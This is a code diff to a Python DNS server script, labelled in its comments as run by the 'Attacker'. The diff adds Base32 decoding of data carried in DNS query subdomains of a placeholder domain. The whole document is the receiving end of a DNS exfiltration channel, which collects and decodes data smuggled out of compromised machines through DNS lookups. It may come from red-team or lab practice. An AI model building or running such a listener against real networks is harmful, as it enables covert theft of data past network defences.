@@ -1,6 +1,7 @@
 import socket
 import re
 import binascii
+import base64
 from dnslib import DNSRecord
 
 # Attacker: sudo python3 ns-dnsserv.py
@@ -27,13 +28,22 @@ while True:
         # Extract the queried domain name
         domain_name = str(msg.q.qname)
 
-        # Regex search for the specific domain pattern in the DNS message
-        m = re.search(r'(\S+)\.<sub-domain>\.<domain>\.com', domain_name)
-        
-        # If a match is found, print the extracted data
+        # Regex search for the specific Base32 encoded string pattern in the DNS message
+        m = re.search(r'([A-Z2-7]+)\.<sub-domain>\.<domain>\.com', domain_name)
+
+        # If a match is found, decode the Base32 encoded string
         if m:
-            print(f"Got data from {addr}: {m.group(1)}")
-        
+            encoded_string = m.group(1)
+            try:
+                # Decode the Base32 string
+                decoded_bytes = base64.b32decode(encoded_string)
+                decoded_string = decoded_bytes.decode('utf-8')
+
+                print(f"Got Base32 encoded data from {addr}: {encoded_string}")
+                print(f"Decoded name: {decoded_string}")
+            except Exception as e:
+                print(f"Failed to decode Base32 string: {encoded_string}. Error: {e}")
+
     except Exception as e:
         # Print any errors during message processing
         print(f"Error: {e}")
